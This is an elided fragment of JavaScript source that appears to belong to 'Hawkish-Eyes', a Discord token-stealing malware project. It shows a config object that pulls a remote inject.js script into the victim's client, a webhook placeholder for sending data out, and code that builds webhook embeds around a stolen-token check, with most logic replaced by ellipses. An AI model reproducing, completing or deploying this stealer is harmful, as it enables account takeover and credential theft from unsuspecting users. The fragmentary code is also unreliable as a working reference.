...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/SystemVll/Hawkish-Eyes/main/inject.js",
    webhook: "%WEBHOOK%",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: `©[${config.creator}] | https://github.com/SystemVll/Hawkish-Eyes-NoDualHook`
            },
    ...
    if (!token) {
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/SystemVll/Hawkish-Eyes-NoDualHook)`,
                inline: !0
            }, {
